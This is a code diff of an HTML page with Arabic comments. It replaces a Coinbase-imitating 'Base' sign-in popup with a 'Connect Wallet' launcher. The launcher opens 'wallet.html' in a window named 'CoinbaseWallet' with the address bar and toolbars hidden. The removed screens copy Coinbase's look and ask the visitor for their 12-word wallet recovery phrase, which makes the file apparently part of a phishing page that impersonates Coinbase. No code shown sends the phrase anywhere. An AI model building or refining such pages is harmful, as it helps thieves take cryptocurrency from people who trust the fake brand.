@@ -2,182 +2,47 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Wallet</title>
+    <title>Base | Login</title>
     <style>
-        /* إعدادات الجسم لجعل الصفحة تبدو كأنها خلفية شفافة */
-        body, html {
+        /* خلفية الصفحة الأساسية اللي بتفتح النافذة */
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: rgba(0, 0, 0, 0.6); /* خلفية داكنة لتركيز الانتباه على النافذة */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            overflow: hidden;
         }
-
-        /* حاوية النافذة المنبثقة (تشبه واجهة الصورة التي أرفقتها) */
-        .app-container {
-            width: 380px; /* العرض المثالي للنافذة المنبثقة */
-            height: 620px; /* الارتفاع المثالي */
-            background-color: #ffffff; /* خلفية بيضاء مثل Coinbase */
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            animation: popupAppear 0.3s ease-out;
-        }
-
-        @keyframes popupAppear {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        /* الهيدر العلوي الصغير */
-        .top-header {
-            padding: 16px;
-            display: flex;
-            justify-content: flex-end;
-            background-color: #ffffff;
-        }
-
-        .help-link {
-            color: #0052ff;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        /* الشاشات داخل النافذة */
-        .screen {
-            display: none;
-            flex-direction: column;
-            padding: 20px 24px;
-            height: 100%;
-            color: #000000;
-        }
-
-        .active { display: flex; }
-
-        /* الشاشة الأولى - تسجيل الدخول */
-        #screen-1 {
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        .logo-box {
-            width: 64px;
-            height: 64px;
-            background-color: #0052ff;
-            border-radius: 12px;
-            margin-bottom: 40px;
-        }
-
-        .screen-title {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .subtitle {
-            color: #5b616e;
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 40px;
-        }
-
-        /* الأزرار بتصميم Coinbase الجديد */
-        .btn-group {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: auto;
-            padding-bottom: 20px;
-        }
-
-        .btn-sign-in {
+        .open-btn {
+            padding: 15px 30px;
             background-color: #0052ff;
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 8px;
             cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
         }
-
-        .btn-create {
-            background-color: #f0f2f5;
-            color: #000000;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        /* واجهة إدخال الكلمات */
-        .phrase-textarea {
-            width: 100%;
-            height: 120px;
-            border: 1px solid #d6d9dc;
-            border-radius: 12px;
-            padding: 12px;
-            font-size: 16px;
-            resize: none;
-            margin-top: 20px;
-        }
-
-        .back-btn {
-            cursor: pointer;
-            font-size: 20px;
-            margin-bottom: 20px;
-        }
-
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <div class="top-header">
-            <a href="#" class="help-link">Help</a>
-        </div>
-
-        <div id="screen-1" class="screen active">
-            <div class="logo-box"></div>
-            <h1 class="screen-title">Sign In</h1>
-            <p class="subtitle">Sign in to Base to use apps and send payments.</p>
-            
-            <div class="btn-group">
-                <button class="btn-sign-in" onclick="navigateTo('screen-2')">Sign in</button>
-                <button class="btn-create">Create account</button>
-            </div>
-        </div>
-
-        <div id="screen-2" class="screen">
-            <div class="back-btn" onclick="navigateTo('screen-1')">←</div>
-            <h2 class="screen-title">Import Wallet</h2>
-            <p class="subtitle">Enter your 12-word recovery phrase to continue.</p>
-            <textarea class="phrase-textarea" placeholder="Enter recovery phrase"></textarea>
-            <div class="btn-group">
-                <button class="btn-sign-in" style="margin-top: 20px;">Continue</button>
-            </div>
-        </div>
-    </div>
+    <button class="open-btn" onclick="openWalletPopup()">Connect Wallet</button>
 
     <script>
-        function navigateTo(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(screenId).classList.add('active');
+        function openWalletPopup() {
+            // مقاسات النافذة اللي في الصورة تقريباً 400 في 600
+            const width = 400;
+            const height = 650;
+            const left = (screen.width / 2) - (width / 2);
+            const top = (screen.height / 2) - (height / 2);
+
+            const params = `width=${width},height=${height},top=${top},left=${left},resizable=no,scrollbars=no,status=no,location=no,toolbar=no,menubar=no`;
+            
+            // استبدل 'wallet.html' باسم ملف الكود تبعك
+            window.open('wallet.html', 'CoinbaseWallet', params);
         }
     </script>
+
 </body>
 </html>
